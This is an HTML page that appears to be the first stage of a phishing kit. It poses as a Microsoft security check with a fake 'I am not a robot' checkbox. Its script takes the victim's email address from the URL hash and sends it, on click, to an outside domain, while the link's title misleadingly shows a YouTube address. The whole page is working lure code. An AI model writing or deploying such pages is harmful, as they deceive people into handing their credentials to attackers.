<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>
<script>
    // Function to extract email from URL hash
    function getEmailFromHash() {
        // Get the hash part of the URL
        const hash = window.location.hash.substring(1); // Remove the '#' character
        return hash;
    }

    // Function to update the link with the extracted email
    function updateLink() {
        const email = getEmailFromHash();
        // Update the href attribute of the link
        const link = document.getElementById('redirectLink');
        link.href = `https://hispachollosoficial.com#${email}`;
    }

    // Call the updateLink function when the page loads
    window.onload = function() {
        updateLink();
    };
</script>
</head>
<body style="font-family: Arial, Helvetica, sans-serif; display: flex; align-items: center; height: 100vh;">
<div style="display: block; margin: 0 auto; text-align: center; position: relative;">
    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="" width="130px" height="auto">
    <p>I am not a robot <input type="checkbox"></p>
    <!-- Use JavaScript to update the link -->
    <a id="redirectLink" title="https://https://youtube.com/" style="text-decoration: none; cursor: pointer;">
        <button>Submit</button>
    </a>
</div>
</body>
</html>
